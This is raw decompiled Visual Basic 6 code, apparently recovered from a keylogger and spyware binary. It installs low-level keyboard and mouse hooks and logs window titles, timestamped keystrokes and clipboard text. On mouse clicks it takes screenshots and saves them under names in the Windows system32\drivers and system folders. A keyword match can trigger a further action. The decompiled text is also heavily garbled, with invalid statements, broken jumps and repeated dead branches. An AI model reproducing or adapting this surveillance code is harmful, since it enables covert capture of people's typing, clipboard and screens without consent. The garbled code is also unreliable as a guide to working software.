
Public Sub Proc_2_0_415EC0
  Dim var_14 As App
  If global_42C014 = 0 Then
    If 0042C12Ch = 0 Then
      var_eax = GetForegroundWindow(edi, esi)
    End If
    var_14 = Global.App
    var_18 = Global.hInstance
    var_eax = SetWindowsHookEx(13, global_00416130, var_18, edi)
    global_42C010 = SetWindowsHookEx(13, global_00416130, var_18, edi)
    global_42C014 = True
  End If
  GoTo loc_00415FBC
  Exit Sub
  loc_00415FBC: 
End Sub

Public Sub Proc_2_1_416000
  Dim var_14 As App
  If global_42C01C = 0 Then
    var_14 = Global.App
    var_18 = Global.hInstance
    var_eax = SetWindowsHookEx(14, global_00417A20, var_18, edi)
    global_42C018 = SetWindowsHookEx(14, global_00417A20, var_18, edi)
    global_42C01C = FFFFFFh
  End If
  GoTo loc_004160E7
  Exit Sub
  loc_004160E7: 
End Sub

Public Sub Proc_2_2_416130
  Dim var_5C As Clipboard
  If arg_8 < 0 Then
    var_eax = CallNextHookEx(global_0042C010, arg_8, arg_C, arg_10)
    var_3C = CallNextHookEx(global_0042C010, arg_8, arg_C, arg_10)
    GoTo loc_00417893
  End If
  var_eax = GetForegroundWindow(global_004178BC, edi)
  var_D8 = GetForegroundWindow(global_004178BC, edi)
  If 0042C028h <> GetForegroundWindow(global_004178BC, edi) Then
    var_eax = GetForegroundWindow(esi)
    var_D8 = GetForegroundWindow(esi)
    global_42C028 = var_D8
    var_eax = Proc_2_12_419C60(var_D8, ebx, )
    global_0042C030 = Proc_2_12_419C60(var_D8, ebx, )
    var_eax = Proc_2_11_419B10(global_0042C028, , )
    global_0042C02C = Proc_2_11_419B10(global_0042C028, , )
    var_10C = global_0042C074
    If 00000001h <= global_0042C074 Then
      If 0042C078h Then
        If 0042C078h = 1 Then
          var_14 = var_14 - .%x1 = GetIDsOfNames(%StkVar2) 'Ignore this
          If var_14 >= 0 Then
            var_eax = Err.Raise
          End If
          var_134 = var_14(-3)
          GoTo loc_004162FC
        End If
      End If
      var_eax = Err.Raise
      var_134 = Err.Raise
  loc_004162FC: 
      If var_42C078 Then
        If 0042C078h = 1 Then
          var_14 = var_14 - .%x1 = GetIDsOfNames(%StkVar2) 'Ignore this
          If var_14 >= 0 Then
            var_eax = Err.Raise
          End If
          GoTo loc_00416335
        End If
      End If
      var_eax = Err.Raise
  loc_00416335: 
      var_44 = global_00407CCC & global_0042C02C & global_00407CCC
      var_4C = global_00406F58 & global_0042C030 & global_00406F58
      If var_48 = 0 Then
        00000001h = 00000001h + var_14
        var_14 = 00000001h+var_14
        GoTo loc_004162A8
      End If
      var_ret_1 = var_14
    End If
    If 0042C038h > var_42C040 Then
      var_40 = Right$(global_0042C048, 3)
      var_44 = global_004096CC & "vbCrLf"
      ebx = (var_40 = var_44) + 1
      If (var_40 = var_44) + 1 Then
        var_eax = Proc_1_0_411210(global_0042C048)
        var_eax = Proc_1_8_415980(global_0042C0E8, Proc_1_0_411210(global_0042C048))
        GoTo loc_004164F0
      End If
      var_40 = global_0042C048 & "vbCrLf"
      var_eax = Proc_1_0_411210(var_40)
      var_eax = Proc_1_8_415980(global_0042C0E8, Proc_1_0_411210(var_40))
  loc_004164F0: 
      global_42C038 = global_0042C040
      var_eax = Proc_2_20_41AE70
      If Len(global_0042C09C) > 0 Then
        If InStr(1, global_0042C048, global_0042C09C, 1) > 0 Then
          var_eax = Proc_2_23_41D690(global_0042C0A0, global_0042C048, 0)
        End If
      End If
    End If
    var_40 = global_004096D4 & global_0042C02C
    var_4C = var_40 & global_004096D4 & global_0042C030 & global_004096D4
    global_0042C048 = 1 & Format$(Now, "d/m/yy h:m") & global_004096D4 & "vbCrLf"
    global_42C040 = Len(global_0042C048)
    var_5C = Global.Clipboard
    var_eax = Global.GetText 10
    global_0042C04C = var_40
    If Len(global_0042C04C) >= 50 Then edx = 1
    If Len(global_0042C04C) <= 0 Then edx = 1
    If edx = 0 Then
      global_0042C048 = global_0042C048 & "Clipboard´" & global_0042C04C & global_004096CC & "vbCrLf"
    End If
    global_42C034 = Len(global_0042C048)
    global_42C038 = Len(global_0042C048)
    GoTo loc_004167BF
  End If
  loc_004167BF: 
  If 0042C050h = 0 Then
    global_42C038 = global_0042C040
  loc_004167DD: 
    var_eax = CallNextHookEx(global_0042C010, arg_8, arg_C, arg_10)
    var_3C = CallNextHookEx(global_0042C010, arg_8, arg_C, arg_10)
    GoTo loc_00417893
  End If
  var_eax = GetAsyncKeyState(16)
  var_D4 = GetAsyncKeyState(16)
  global_42C01E = -32768
  var_eax = GetAsyncKeyState(18)
  var_D4 = GetAsyncKeyState(18)
  global_42C020 = -32768
  var_eax = GetAsyncKeyState(17)
  var_D4 = GetAsyncKeyState(17)
  global_42C022 = -32768
  var_eax = GetKeyState(20)
  global_42C024 = GetKeyState(20)
  If arg_C = 257 Then GoTo loc_004167DD
  If arg_C = 261 Then GoTo loc_004167DD
  If global_42C020 <> 0 Then GoTo loc_004167DD
  If global_42C022 <> 0 Then GoTo loc_004167DD
  var_D8 = VarPtr(var_2C)
  var_eax = CopyMemory(VarPtr(var_2C), arg_10, 20)
  If var_2C >= 1 Then
    If var_2C <= 64 Then
      If var_2C(-1) > 49 Then GoTo loc_00417739
      GoTo loc_[edx*4+004178D4h]
      If 0042C038h <= var_42C034 Then GoTo loc_00417739
      0042C038h = 0042C038h - 00000001h
      var_40 = Mid$(global_0042C048, global_0042C038, 2)
      ebx = (var_40 = "vbCrLf") + 1
      If (var_40 = "vbCrLf") + 1 Then
        0042C038h = 0042C038h - 00000002h
        0042C038h = 0042C038h + 00000001h
        var_44 = Mid$(global_0042C048, 0042C038h+00000001h, var_70)
        global_0042C048 = Left$(global_0042C048, global_0042C038) & global_0042C048 & "Clipboard´" & global_0042C04C
        0042C038h = 0042C038h - 00000002h
        global_42C038 = global_0042C038
        GoTo loc_00417739
      End If
      0042C038h = 0042C038h - 00000001h
      0042C038h = 0042C038h + 00000001h
      var_44 = Mid$(global_0042C048, 0042C038h+00000001h, var_70)
      global_0042C048 = Left$(global_0042C048, global_0042C038) & global_0042C048 & "Clipboard´" & global_0042C04C
  loc_00416AC8: 
      global_42C038 = global_0042C038
      GoTo loc_00417739
      var_40 = Right$(global_0042C048, 5)
      call (var_40 = "vbCrLf") + 1("¶TAB¶", var_40, global_004178BC, var_AC, var_A8, var_A4, var_40, 00000001h, var_4C)
      If (var_40 = "vbCrLf") + 1("¶TAB¶", var_40, global_004178BC, var_AC, var_A8, var_A4, var_40, 00000001h, var_4C) Then
        global_0042C048 = global_0042C048 & "¶TAB¶"
        global_42C034 = Len(global_0042C048)
        global_42C038 = Len(global_0042C048)
        GoTo loc_00417739
        0042C038h = 0042C038h - 00000001h
        var_40 = Mid$(global_0042C048, global_0042C038, 2)
        (var_40 = "vbCrLf") + 1("¶TAB¶", var_40, global_004178BC, var_AC, var_A8, var_A4, var_40, 00000001h, var_4C)
        If var_40 Then
          global_0042C044 = "vbCrLf"
        End If
        If var_42C078 Then
          If 0042C078h = 1 Then
            0042C050h = 0042C050h - ecx+00000014h
            If 0042C050h >= 0 Then
              var_eax = Err.Raise
            End If
            GoTo loc_00416BF5
          End If
        End If
        var_eax = Err.Raise
  loc_00416BF5: 
        If ecx+eax+00000004h Then
          var_eax = ClientToScreen(global_0042C028, var_38)
          If var_F8 Then
            If var_F8 = 1 Then
              0042C050h = 0042C050h - var_F8(6)
              If 0042C050h >= 0 Then
                var_eax = Err.Raise
              End If
              GoTo loc_00416C71
            End If
          End If
          var_eax = Err.Raise
  loc_00416C71: 
          var_4C = global_0042C130 & "system32\drivers\" & CStr(global_0042C050)
          var_eax = Proc_1_1_4115D0(var_48, var_4C, var_F8)
          var_30 = global_0042C078 & Proc_1_1_4115D0(var_48, var_4C, var_F8)
          var_11C = ebx+00000004h
  loc_00416D0A: 
          If 00000001h <= ebx+00000004h Then
            If var_FC Then
              If var_FC = 1 Then
                00000001h = 00000001h - var_FC(6)
                If 00000001h >= 0 Then
                  var_eax = Err.Raise
                End If
                GoTo loc_00416D6D
              End If
            End If
            var_eax = Err.Raise
  loc_00416D6D: 
            var_eax = Unknown_VTable_Call[ecx+00000300h]
            var_FC(5)(2) = var_FC(5)(2) + var_34
            var_DC = var_FC(5)(2)+var_34
            var_FC(5) = var_FC(5) + var_38
            var_D8 = var_FC(5)+var_38
            var_eax = Proc_2_4_418C10(var_5C, var_FC(5)(3), var_FC(5)(4))
            var_eax = Proc_9_1_42A460(global_0042C0EC, var_30 & CStr(vbNull) & global_00406BFC & global_0042C14C, var_FC(5)(3))
            GoTo loc_00416E88
          End If
  loc_00416E88: 
          If var_E8 = 0 Then
            00000001h = 00000001h + var_14
            GoTo loc_00416D0A
          End If
          var_DC = Rnd(10)
          var_78 = (var_DC * global_402150)
          var_ret_2 = CLng(Round((var_DC * global_402150), 0) + 6)
          var_D8 = var_ret_2
          var_eax = Proc_1_2_411900(var_D8, var_FC, var_FC(5)(4))
          var_18 = Proc_1_2_411900(var_D8, var_FC, var_FC(5)(4))
          global_0042C048 = global_0042C048 & global_00409798 & var_18 & global_00409798
          global_42C034 = Len(global_0042C048)
          global_42C038 = Len(global_0042C048)
          var_eax = Unknown_VTable_Call[ecx+00000314h]
          ebx+00000014h = ebx+00000014h + var_34
          var_E4 = ebx+00000014h+var_34
          ebx+00000010h = ebx+00000010h + var_38
          var_E0 = ebx+00000010h+var_38
          ebx+0000001Ch = ebx+0000001Ch - ebx+00000014h
          var_DC = ebx+0000001Ch
          ebx+00000018h = ebx+00000018h - ebx+00000010h
          var_D8 = ebx+00000018h
          var_eax = Proc_2_4_418C10(var_5C, var_D8, var_DC)
          var_eax = Proc_2_20_41AE70(var_E0, var_E4, global_0042C130 & "system\" & var_18 & global_00406BFC & global_0042C14C)
        End If
        GoTo loc_00417739
        GoTo loc_0041772E
        global_42C03C = InStr(global_0042C038, global_0042C048, "vbCrLf", 0)
        If InStr(global_0042C038, global_0042C048, "vbCrLf", 0) > 0 Then
          InStr(global_0042C038, global_0042C048, "vbCrLf", 0) = InStr(global_0042C038, global_0042C048, "vbCrLf", 0) - 00000001h
          global_42C038 = InStr(global_0042C038, global_0042C048, "vbCrLf", 0)
          GoTo loc_00417739
        End If
        global_42C038 = Len(global_0042C048)
        GoTo loc_00417739
        global_42C03C = InStrRev(global_0042C048, "vbCrLf", global_0042C038, 0)
        If InStrRev(global_0042C048, "vbCrLf", global_0042C038, 0) > 0 Then
  loc_004171B9: 
          global_42C038 = InStrRev(global_0042C048, "vbCrLf", global_0042C038, 0)+00000001h
          GoTo loc_00417739
        End If
        global_42C038 = global_0042C034
        GoTo loc_00417739
        If 0042C038h > var_42C034 Then
          0042C038h = 0042C038h - 00000001h
          var_40 = Mid$(global_0042C048, global_0042C038, 2)
          call 00000001h+var_14("vbCrLf", var_40, var_F8, var_5C, var_60, var_60, Unknown_VTable_Call[ecx+00000314h], global_0042C060)
          ebx = 00000001h+var_14("vbCrLf", var_40, var_F8, var_5C, var_60, var_60, Unknown_VTable_Call[ecx+00000314h], global_0042C060) + 1
          If 00000001h+var_14("vbCrLf", var_40, var_F8, var_5C, var_60, var_60, Unknown_VTable_Call[ecx+00000314h], global_0042C060) + 1 = 0 Then GoTo loc_00416AC8
          0042C038h = 0042C038h - 00000002h
          global_42C038 = global_0042C038
          GoTo loc_00417739
          If 0042C038h < 0 Then
            0042C038h = 0042C038h + 00000001h
            var_40 = Mid$(global_0042C048, 0042C038h+00000001h, 2)
            call 00000001h+var_14("vbCrLf", var_40, var_F8, var_5C, var_60, var_60, Unknown_VTable_Call[ecx+00000314h], global_0042C060) + 1("vbCrLf", var_40)
            ebx = 00000001h+var_14("vbCrLf", var_40, var_F8, var_5C, var_60, var_60, Unknown_VTable_Call[ecx+00000314h], global_0042C060) + 1("vbCrLf", var_40) + 1
            If 00000001h+var_14("vbCrLf", var_40, var_F8, var_5C, var_60, var_60, Unknown_VTable_Call[ecx+00000314h], global_0042C060) + 1("vbCrLf", var_40) + 1 = 0 Then GoTo loc_004171B9
            0042C038h = 0042C038h + 00000002h
            global_42C038 = 0
            GoTo loc_00417739
            If 0042C038h < 0 Then
              0042C038h = 0042C038h + 00000001h
              var_40 = Mid$(global_0042C048, 0042C038h+00000001h, 2)
              call 00000001h+var_14("vbCrLf", var_40, var_F8, var_5C, var_60, var_60, Unknown_VTable_Call[ecx+00000314h], global_0042C060) + 1("vbCrLf", var_40) + 1("vbCrLf", var_40)
              ebx = 00000001h+var_14("vbCrLf", var_40, var_F8, var_5C, var_60, var_60, Unknown_VTable_Call[ecx+00000314h], global_0042C060) + 1("vbCrLf", var_40) + 1("vbCrLf", var_40) + 1
              If 00000001h+var_14("vbCrLf", var_40, var_F8, var_5C, var_60, var_60, Unknown_VTable_Call[ecx+00000314h], global_0042C060) + 1("vbCrLf", var_40) + 1("vbCrLf", var_40) + 1 Then
                0042C038h = 0042C038h + 00000003h
                var_44 = Mid$(global_0042C048, 0042C038h+00000003h, var_70)
                global_0042C048 = Left$(global_0042C048, global_0042C038) & global_0042C130 & "system\" & var_18
                GoTo loc_00417412
              End If
              0042C038h = 0042C038h + 00000002h
              var_44 = Mid$(global_0042C048, 0042C038h+00000002h, var_70)
              global_0042C048 = Left$(global_0042C048, global_0042C038) & global_0042C130 & "system\" & var_18
  loc_00417412: 
              GoTo loc_00417739
              If global_42C01E Then
                GoTo loc_0041772E
              End If
              GoTo loc_0041772E
              If global_42C01E Then
                GoTo loc_0041772E
              End If
              GoTo loc_0041772E
              If global_42C01E Then
                GoTo loc_0041772E
              End If
              GoTo loc_0041772E
              If global_42C01E Then
                GoTo loc_0041772E
              End If
              GoTo loc_0041772E
              If global_42C01E Then
                GoTo loc_0041772E
              End If
              GoTo loc_0041772E
              If global_42C01E Then
                GoTo loc_0041772E
              End If
              GoTo loc_0041772E
              If global_42C01E Then
                GoTo loc_0041772E
              End If
              GoTo loc_0041772E
              If global_42C01E Then
                GoTo loc_0041772E
              End If
              GoTo loc_0041772E
              If global_42C01E Then
                GoTo loc_0041772E
              End If
              GoTo loc_0041772E
              If global_42C01E Then
                GoTo loc_0041772E
              End If
              GoTo loc_0041772E
            End If
          End If
          If global_0042C048 >= 65 Then
            If global_0042C048 <= 90 Then
              If 0042C01Eh <> var_42C024 Then GoTo loc_004175BF
              global_0042C044 = LCase$(Chr$(global_0042C048))
              GoTo loc_00417739
            End If
          End If
          If global_0042C044 >= 91 Then
            If global_0042C044 <= 95 Then GoTo loc_00417739
          End If
          If global_0042C044 >= 96 Then
            If global_0042C044 <= 105 Then
              global_0042C044 = global_0042C044 - 00000030h
              global_0042C044 = Chr$(global_0042C044)
              GoTo loc_00417739
            End If
          End If
          If global_0042C044 < 106 Then GoTo loc_0041782B
          If global_0042C044 > 255 Then GoTo loc_0041782B
          global_0042C044 = global_0042C044 + FFFFFF96h
          If global_0042C044+FFFFFF96h <= 116 Then
            GoTo loc_[edx*4+00417958h]
            GoTo loc_0041772E
            If global_42C01E Then
              GoTo loc_0041772E
            End If
            GoTo loc_0041772E
            If global_42C01E Then
              GoTo loc_0041772E
            End If
            GoTo loc_0041772E
            If global_42C01E Then
              GoTo loc_0041772E
            End If
            GoTo loc_0041772E
            If global_42C01E Then
              GoTo loc_0041772E
            End If
            GoTo loc_0041772E
            If global_42C01E Then
              GoTo loc_0041772E
            End If
            GoTo loc_0041772E
            If global_42C01E Then
              GoTo loc_0041772E
            End If
            GoTo loc_0041772E
            If global_42C01E Then
              GoTo loc_0041772E
            End If
            GoTo loc_0041772E
            If global_42C01E Then
              GoTo loc_0041772E
            End If
            GoTo loc_0041772E
            If global_42C01E Then
              GoTo loc_0041772E
            End If
            GoTo loc_0041772E
            If global_42C01E Then
              GoTo loc_0041772E
            End If
            GoTo loc_0041772E
            If global_42C01E = 0 Then
  loc_0041772E: 
            global_0042C044 = 004095ECh
  loc_00417739: 
  loc_00417739: 
  loc_00417739: 
  loc_00417739: 
  loc_00417739: 
  loc_00417739: 
  var_40 = Left$(global_0042C048, global_0042C038)
  var_44 = var_40 & global_0042C044
  0042C038h = 0042C038h + 00000001h
  var_48 = Mid$(global_0042C048, 0042C038h+00000001h, 10)
  global_0042C048 = var_44 & global_0042C130 & "system\" & var_18 & global_00406BFC
  Len(global_0042C044) = Len(global_0042C044) + 0042C038h
  global_42C038 = Len(global_0042C044)+0042C038h
  global_0042C044 = 00408114h
  var_eax = CallNextHookEx(global_0042C010, arg_8, arg_C, arg_10)
  var_3C = CallNextHookEx(global_0042C010, arg_8, arg_C, arg_10)
  GoTo loc_00417893
  loc_0041782B: 
  var_eax = Proc_2_0_415EC0
  GoTo loc_00417893
  Exit Sub
  loc_00417893: 
  Exit Sub
End Sub

Public Sub Proc_2_3_417A20
  Dim var_100 As Variant
  Dim var_104 As Me
  Dim var_78 As Me
  Dim var_F0 As Me
  Dim var_EC As Me
  Dim global_0042C0EC As Me
  Dim var_108 As Me
  If arg_8 = 0 Then
    If arg_C = 513 Then
      var_120 = global_0042C074
  loc_00417B16: 
      If var_14 <= global_0042C074 Then
        If var_100 Then
          If var_100 = 1 Then
            var_14 = var_14 - var_100.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this
            If var_14 >= 0 Then
              var_eax = Err.Raise
            End If
            GoTo loc_00417B7A
          End If
        End If
        var_eax = Err.Raise
  loc_00417B7A: 
        var_10C = var_100.GetTypeInfoCount 'Ignore this(1)
        If var_100.AddRef 'Ignore this Then
          var_eax = GetForegroundWindow(ebx)
          var_EC = GetForegroundWindow(ebx)
          var_20 = var_EC
          var_eax = Proc_2_12_419C60(var_EC, , )
          var_24 = Proc_2_12_419C60(var_EC, , )
          var_eax = Proc_2_11_419B10(var_20, , )
          var_40 = Proc_2_11_419B10(var_20, , )
          var_60 = global_00406F58 & var_24
          var_64 = var_60 & global_00406F58
          var_5C = global_00407CCC & var_40 & global_00407CCC
          If var_60 <> 0 Then GoTo loc_00417C8E
        End If
        00000001h = 00000001h + var_14
        var_14 = 00000001h+var_14
        GoTo loc_00417B16
  loc_00417C8E: 
        var_eax = ClientToScreen(var_20, var_38)
        var_eax = CopyMemory(var_54, arg_10, 20)
        var_54 = var_54 - var_38
        var_3C = var_54
        var_50 = var_50 - var_34
        var_28 = var_50
        var_64 = global_004096D4 & var_40 & global_004096D4 & var_24 & global_004096D4
        ebx = InStr(1, global_0042C048, var_64, 1) + 1
        If InStr(1, global_0042C048, var_64, 1) + 1 Then
          If 0042C038h > var_42C040 Then
            var_58 = Right$(global_0042C048, 3)
            var_5C = global_004096CC & "vbCrLf"
            ebx = (var_58 = var_5C) + 1
            If (var_58 = var_5C) + 1 Then
              var_eax = Proc_1_0_411210(global_0042C048, var_100, )
              var_eax = Proc_1_8_415980(global_0042C0E8, Proc_1_0_411210(global_0042C048, var_100, ), )
              GoTo loc_00417E27
            End If
            var_58 = global_0042C048 & "vbCrLf"
            var_eax = Proc_1_0_411210(var_58, , )
            var_eax = Proc_1_8_415980(global_0042C0E8, Proc_1_0_411210(var_58, , ), )
  loc_00417E27: 
          var_64 = global_004096D4 & var_40 & global_004096D4 & var_24 & global_004096D4
          global_0042C048 = 1 & Format$(Now, "d/m/yy h:m") & global_004096D4 & "vbCrLf"
          global_42C040 = Len(global_0042C048)
          global_42C034 = Len(global_0042C048)
          global_42C038 = Len(global_0042C048)
        End If
        var_60 = "ÀòèæyîØuâãgo=?@óyw"
        var_64 = global_0042C130 & "system32\drivers\" & CStr(var_14)
        var_eax = Proc_1_1_4115D0(var_60, var_64, 1)
        var_30 = var_64 & Proc_1_1_4115D0(var_60, var_64, 1)
        var_128 = var_100.GetTypeInfo 'Ignore this
        If 00000001h <= var_128 Then
          If var_104 Then
            If var_104 = 1 Then
              00000001h = 00000001h - var_100.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this
              If 00000001h >= 0 Then
                var_eax = Err.Raise
              End If
              ebx*8 = ebx*8 - 00000001h
              GoTo loc_0041802F
            End If
          End If
          var_eax = Err.Raise
  loc_0041802F: 
          If var_3C > 0 Then
            If var_3C < 0 Then
              If var_28 > 0 Then
                If var_28 < 0 Then
                  var_eax = Unknown_VTable_Call[ecx+00000300h]
                  var_100.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this = var_100.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this + var_34
                  var_F0 = var_100.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this+var_34
                  var_100.GetTypeInfo 'Ignore this = var_100.GetTypeInfo 'Ignore this + var_38
                  var_EC = var_100.GetTypeInfo 'Ignore this+var_38
                  call Proc_2_4_418C10(var_74, var_100.%x1 = Invoke, var_100.%x3 = PropBag.ReadProperty(%StkVar1, %StkVar2))
                  call Proc_9_1_42A460(global_0042C0EC, var_30 & CStr(vbNull) & global_00406BFC & global_0042C14C, var_100.%x1 = Invoke)
                  GoTo loc_00418179
                End If
  loc_00418179: 
                If var_FC = 0 Then
                End If
              End If
            End If
          End If
          00000001h = 00000001h + var_18
          var_18 = 00000001h+var_18
          GoTo loc_00417FCA
        End If
        var_F0 = Rnd(10)
        var_90 = (var_F0 * global_402150)
        var_ret_1 = CLng(Round((var_F0 * global_402150), 0) + 6)
        var_EC = var_ret_1
        var_eax = Proc_1_2_411900(var_EC, var_104, var_74)
        var_1C = Proc_1_2_411900(var_EC, var_104, var_74)
        global_0042C048 = global_0042C048 & global_00409798 & var_1C & global_00409798
        global_42C034 = Len(global_0042C048)
        global_42C038 = Len(global_0042C048)
        var_154 = var_100.LoadProp 'Ignore this
        If var_100.LoadProp 'Ignore this = 0 Then
          var_eax = Unknown_VTable_Call[ecx+00000314h]
          var_64 = global_0042C130 & "system\" & var_1C & global_00406BFC & global_0042C14C
          var_34 = var_34 + var_100.SetPropA 'Ignore this
          var_F8 = var_34+var_100.SetPropA 'Ignore this
          var_38 = var_38 + var_100.PropBag.WriteProperty(%StkVar1, %StkVar2, %StkVar3)
          var_F4 = var_38+var_100.PropBag.WriteProperty(%StkVar1, %StkVar2, %StkVar3)
          var_F0 = var_100.GetPropHsz 'Ignore this
          var_100.%x1 = Forms = var_100.%x1 = Forms - ebx+00000020h
          var_EC = var_100.%x1 = Forms
          GoTo loc_004184E5
        End If
        var_eax = Unknown_VTable_Call[edx+00000314h]
        var_64 = global_0042C130 & "system\" & var_1C & global_00406BFC & global_0042C14C
        00000001h+var_18 = 00000001h+var_18 + 00000034h
        var_50 = var_50 - var_100.SaveProp 'Ignore this
        var_F0 = var_50
        var_54 = var_54 - var_154
        var_EC = var_54
  loc_004184E5: 
        var_eax = Proc_2_4_418C10(var_74, var_154, 00000001h+var_18+00000034h)
        var_eax = Proc_2_20_41AE70(var_EC, var_F0, var_64)
      End If
      var_eax = Proc_41BB30(var_54, var_50, var_74)
      If Proc_41BB30(var_54, var_50, var_74) Then
        var_64 = global_0042C130 & "system32\drivers\" & CStr(var_14)
        var_eax = Proc_1_1_4115D0(var_60, var_64, var_78)
        var_30 = Unknown_VTable_Call[edx+00000314h] & Proc_1_1_4115D0(var_60, var_64, var_78)
        var_130 = var_100.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this
        If 00000001h <= var_130 Then
          If var_108 Then
            If var_108 = 1 Then
              00000001h = 00000001h - var_100.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this
              If 00000001h >= 0 Then
                var_eax = Err.Raise
              End If
              ebx*8 = ebx*8 - 00000001h
              GoTo loc_0041862A
            End If
          End If
          var_eax = Err.Raise
  loc_0041862A: 
          If var_3C > 0 Then
            If var_3C < 0 Then
              If var_28 > 0 Then
                If var_28 < 0 Then
                  var_eax = Unknown_VTable_Call[edx+00000300h]
                  var_100.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this = var_100.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this + var_34
                  var_F0 = var_100.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this+var_34
                  var_100.GetTypeInfo 'Ignore this = var_100.GetTypeInfo 'Ignore this + var_38
                  var_EC = var_100.GetTypeInfo 'Ignore this+var_38
                  call Proc_2_4_418C10(var_74, var_100.%x1 = Invoke, var_100.%x3 = PropBag.ReadProperty(%StkVar1, %StkVar2))
                  call Proc_9_1_42A460(global_0042C0EC, var_30 & CStr(vbNull) & global_00406BFC & global_0042C14C, var_100.%x1 = Invoke)
                  GoTo loc_00418774
                End If
  loc_00418774: 
                If var_FC = 0 Then
                End If
              End If
            End If
          End If
          00000001h = 00000001h + var_18
          var_18 = 00000001h+var_18
          GoTo loc_004185C5
        End If
        var_F0 = Rnd(10)
        var_90 = (var_F0 * global_402150)
        var_ret_2 = CLng(Round((var_F0 * global_402150), 0) + 6)
        var_EC = var_ret_2
        var_eax = Proc_1_2_411900(var_EC, var_108, var_74)
        var_1C = Proc_1_2_411900(var_EC, var_108, var_74)
        global_0042C048 = global_0042C048 & global_00409798 & var_1C & global_00409798
        global_42C034 = Len(global_0042C048)
        global_42C038 = Len(global_0042C048)
        var_158 = var_100.LoadProp 'Ignore this
        If var_100.LoadProp 'Ignore this = 0 Then
          var_eax = Unknown_VTable_Call[ecx+00000314h]
          var_64 = global_0042C130 & "system\" & var_1C & global_00406BFC & global_0042C14C
          var_34 = var_34 + var_100.SetPropA 'Ignore this
          var_F8 = var_34+var_100.SetPropA 'Ignore this
          var_38 = var_38 + var_100.PropBag.WriteProperty(%StkVar1, %StkVar2, %StkVar3)
          var_F4 = var_38+var_100.PropBag.WriteProperty(%StkVar1, %StkVar2, %StkVar3)
          var_F0 = var_100.GetPropHsz 'Ignore this
          var_100.%x1 = Forms = var_100.%x1 = Forms - ebx+00000020h
          var_EC = var_100.%x1 = Forms
          GoTo loc_00418ADC
        End If
        var_eax = Unknown_VTable_Call[edx+00000314h]
        var_64 = global_0042C130 & "system\" & var_1C & global_00406BFC & global_0042C14C
        00000001h+var_18 = 00000001h+var_18 + 00000034h
        var_50 = var_50 - var_100.SaveProp 'Ignore this
        var_F0 = var_50
        var_54 = var_54 - var_158
        var_EC = var_54
  loc_00418ADC: 
        var_eax = Proc_2_4_418C10(var_74, var_158, 00000001h+var_18+00000034h)
        var_eax = Proc_2_20_41AE70(var_EC, var_F0, var_64)
      End If
    End If
  End If
  End If
  End If
  var_eax = CallNextHookEx(global_0042C018, arg_8, arg_C, arg_10)
  var_2C = CallNextHookEx(global_0042C018, arg_8, arg_C, arg_10)
  GoTo loc_00418BA6
  Exit Sub
  loc_00418BA6: 
  Exit Sub
End Sub

Public Sub Proc_2_4_418C10
  Dim arg_8 As Me
  Dim var_18 As Me
  var_eax = Proc_2_5_418D00(arg_8, arg_C, arg_10)
  var_eax = Proc_2_9_4199F0(arg_14, arg_18, edi)
  var_14 = Proc_2_9_4199F0(arg_14, arg_18, edi)
  var_18 = arg_8.ControlBox
  var_eax = Proc_2_6_4190D0(CLng(var_28), arg_1C, )
  var_eax = Proc_2_10_419A90(var_14, , )
  GoTo loc_00418CEA
  Exit Sub
  loc_00418CEA: 
End Sub

Public Sub Proc_2_5_418D00
  Dim var_FC As Me
  On Error Resume Next
  var_ret_1 = CStr(0)
  var_ret_2 = CStr(0)
  var_ret_3 = "DISPLAY"
  var_eax = CreateDCA(var_ret_3, var_ret_2, var_ret_1, var_DC, "‡º", var_17C)
  var_E0 = CreateDCA(var_ret_3, var_ret_2, var_ret_1, var_DC, "‡º", var_17C)
  arg_C = arg_C * 15
  var_100 = arg_C
  arg_10 = arg_10 * 15
  var_100 = arg_10
  "‡º" = var_FC.StartUpPosition
  var_100 = var_FC
  var_F8 = var_FC.CurrentX
  var_100 = var_F8
  var_eax = BitBlt(var_F8, 00000000h, 00000000h, arg_C, arg_10, var_E0, arg_14, arg_18)
  var_eax = DeleteDC(var_E0, global_00CC0020, var_DC, var_17C, var_DC)
  GoTo loc_004190B5
  Exit Sub
  loc_004190B5: 
  Exit Sub
End Sub

Public Sub Proc_2_6_4190D0
  var_2C = arg_C
  On Error Resume Next
  var_50 = LCase$(Right$(var_2C, 4))
  If (var_50 = ".png") = 0 Then
    var_24 = "image/png"
    GoTo loc_004192E1
  End If
  If (var_50 = ".gif") = 0 Then
    var_24 = "image/gif"
    GoTo loc_004192E1
  End If
  If (var_50 = ".jpg") = 0 Then
    var_24 = "image/jpeg"
    GoTo loc_004192E1
  End If
  If (var_50 = "jpeg") = 0 Then
    var_24 = "image/jpeg"
    GoTo loc_004192E1
  End If
  If (var_50 = ".tif") = 0 Then
    var_24 = "image/tiff"
    GoTo loc_004192E1
  End If
  If (var_50 = "tiff") = 0 Then
    var_24 = "image/tiff"
    GoTo loc_004192E1
  End If
  If (var_50 = ".bmp") = 0 Then
    var_24 = "image/bmp"
    GoTo loc_004192E1
  End If
  var_24 = "image/jpeg"
  loc_004192E1: 
  var_eax = GdipCreateBitmapFromHBITMAP(arg_8, 00000000h, var_40, FFFFFFFFh)
  var_48 = GdipCreateBitmapFromHBITMAP(arg_8, 00000000h, var_40, FFFFFFFFh)
  If var_48 = 0 Then
    var_eax = Proc_2_7_4193C0(var_24, var_3C, edi)
    If Proc_2_7_4193C0(var_24, var_3C, edi) = 0 Then
      var_4C = VarPtr(var_2C)
      var_eax = GdipSaveImageToFile(var_40, var_4C, var_3C)
      var_48 = GdipSaveImageToFile(var_40, var_4C, var_3C)
      If var_48 = 0 Then ecx = 1
    End If
    var_eax = GdipDisposeImage(var_40, 00000000h)
  End If
  GoTo loc_00419386
  Exit Sub
  loc_00419386: 
End Sub

Public Sub Proc_2_7_4193C0
  Dim var_3C As Variant
  Dim var_2C As Me
  Dim var_40 As Me
  Dim var_28 As Me
  On Error Resume Next
  var_eax = GdipGetImageEncodersSize(var_28, var_38, FFFFFFFFh)
  If var_38 Then
    ReDim var_24(0 To var_28)
    ReDim var_2C(0 To var_38)
    If var_3C Then
